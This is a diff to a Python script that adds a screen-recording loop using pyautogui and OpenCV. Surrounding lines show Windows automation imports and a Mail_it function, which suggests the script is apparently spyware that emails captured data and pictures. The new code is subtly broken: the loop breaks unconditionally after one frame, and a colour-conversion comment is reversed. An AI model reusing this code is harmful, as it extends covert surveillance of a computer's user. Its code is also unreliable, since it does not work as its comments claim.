@@ -13,7 +13,7 @@ import base64
 import win32api
 import pythoncom
 import pyautogui
-import numpy
+import numpy as np
 import cv2
 
 
@@ -120,12 +120,51 @@ def Mail_it(data, pics_names):
 
 #screen recording section
             
+
 resolution = (1920, 1080)
 
+#the video codec type
 codec = cv2.VideoWriter_fourcc(*"XVID")
 
-filename = Recording.avi
+#file for offloading video
+filename = "Recording.avi"
 
+#frame rate of the recording
 fps = 30
 
+#synthesis of VideoWriter 
 out = cv2.VideoWriter(filename, codec, fps, resolution)
+
+#Empty window
+cv2.namedWindow("Live", cv2.WINDOW_NORMAL)
+
+#Window resizing
+cv2.resizeWindow("Live", 480, 270)
+
+while True:
+
+    #screenshots with pyautogui
+    img = pyautogui.screenshot()
+
+    #Convert screenshot into an array with numpy
+    frame = np.array(img)
+
+    #Convert from BGR coloring to RGB
+    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+    #writes to the output files
+    out.write(frame)
+
+    #Displays the REC screen
+    cv2.imshow('Live', frame)
+
+    #Order to stop REC when q is pressed
+    cv2.waitKey(1) == ord('q')
+    break
+
+# releases vid writer
+out.release()
+  
+#Remove all windows
+cv2.destroyAllWindows()
+
